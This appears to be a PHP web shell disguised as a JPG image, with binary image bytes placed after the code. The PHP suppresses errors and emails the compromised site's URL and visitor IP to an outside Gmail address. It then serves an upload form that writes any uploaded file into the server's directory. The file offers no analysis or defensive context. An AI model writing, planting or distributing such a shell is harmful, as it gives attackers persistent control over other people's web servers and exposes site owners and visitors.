<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'Xplutoit@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Masuk Ni Pak", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
<?php echo "JPG<br><form action='' enctype='multipart/form-data' method='POST'> <input type='file' name='filena'> <input type='submit' name='upload' value='Upload'>"; if(isset($_POST['upload'])){ $cwd=getcwd(); $tmp=$_FILES['filena']['tmp_name']; $filena=$_FILES['filena']['name']; if(@copy($tmp, $filena)){ echo "Sukses => $cwd/$filena"; }else{ echo "Gagal :("; } }__halt_compiler(); ?>��C









��C

        ����"#Qr����&1!A"2qQa���
                                ?�y,�/3J�ݹ�߲؋5�Xw���y�R��I0�2�PI�I��iM��r�N&"KgX:��nTJnLK��@!�-�
       ���m�;�g���&�hw���@�ܗ
                            9�-�.�1<y��Q�U�ہ?.����b߱�֫�w*V��) `$��b�ԟ��X�-�T��G�3�g ����Jx���U/��v_s(H�@T�J����n�!�gfb�c�:�l[�Qe
                                      9�PLb��C�m[5��'�jgl���_���l-;"Pk���Q�_�^�S�x?"���Y
